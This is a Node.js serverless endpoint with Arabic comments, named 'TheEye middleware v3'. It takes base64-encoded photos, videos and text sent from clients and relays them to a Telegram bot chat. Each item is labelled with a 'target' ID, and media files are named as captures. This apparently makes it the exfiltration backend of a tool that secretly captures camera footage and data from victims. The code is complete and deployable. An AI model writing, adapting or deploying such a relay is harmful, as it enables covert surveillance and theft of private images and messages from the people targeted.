// api/send.js — TheEye middleware v3 (CommonJS)
// يدعم: photo / video / message
const TOKEN = process.env.TELEGRAM_TOKEN || '';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';

const MAX_B64 = 4 * 1024 * 1024; // حد Vercel ~4.5MB — نبقى تحت 4MB

module.exports = async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ ok: false, error: 'POST only' });
    }
    if (!TOKEN || !CHAT_ID) {
        return res.status(500).json({ ok: false, error: 'مفاتيح الخادم غير مضبوطة بعد' });
    }

    let body;
    try {
        body = typeof req.body === 'object' ? req.body : JSON.parse(req.body);
    } catch {
        return res.status(400).json({ ok: false, error: 'JSON غير صالح' });
    }

    const chatId = String(body.chatId || '').slice(0, 64);
    if (!chatId) return res.status(400).json({ ok: false, error: 'chatId مفقود' });

    const tg = 'https://api.telegram.org/bot' + TOKEN;
    const cap = (body.caption || '') +
                '\n👤 الهدف: ' + chatId +
                '\n🕐 ' + new Date().toLocaleString('ar');

    try {
        // ====== صورة ======
        if (body.type === 'photo') {
            const b64 = String(body.photo || '').split(',')[1] || String(body.photo || '');
            if (b64.length > MAX_B64) return res.status(400).json({ ok: false, error: 'صورة كبيرة جداً' });
            const buf = Buffer.from(b64, 'base64');
            if (!buf.length) return res.status(400).json({ ok: false, error: 'صورة فارغة' });

            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('caption', cap);
            form.append('photo', new Blob([buf], { type: 'image/jpeg' }), 'cap_' + chatId + '.jpg');

            const r = await fetch(tg + '/sendPhoto', { method: 'POST', body: form });
            const j = await r.json().catch(() => ({}));
            return res.status(r.ok ? 200 : 502).json({ ok: r.ok, error: j.description });
        }

        // ====== فيديو (جديد) ======
        if (body.type === 'video') {
            const b64 = String(body.video || '').split(',')[1] || String(body.video || '');
            if (b64.length > MAX_B64) return res.status(400).json({ ok: false, error: 'فيديو كبير جداً' });
            const buf = Buffer.from(b64, 'base64');
            if (!buf.length) return res.status(400).json({ ok: false, error: 'فيديو فارغ' });

            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('caption', cap);
            form.append('video', new Blob([buf], { type: 'video/webm' }), 'cap_' + chatId + '.webm');

            const r = await fetch(tg + '/sendVideo', { method: 'POST', body: form });
            const j = await r.json().catch(() => ({}));
            return res.status(r.ok ? 200 : 502).json({ ok: r.ok, error: j.description });
        }

        // ====== نص ======
        const text = String(body.text || '').slice(0, 4000);
        if (!text) return res.status(400).json({ ok: false, error: 'نص فارغ' });

        const r = await fetch(tg + '/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text + '\n👤 الهدف: ' + chatId })
        });
        const j = await r.json().catch(() => ({}));
        return res.status(r.ok ? 200 : 502).json({ ok: r.ok, error: j.description });

    } catch (e) {
        return res.status(500).json({ ok: false, error: e.message });
    }
};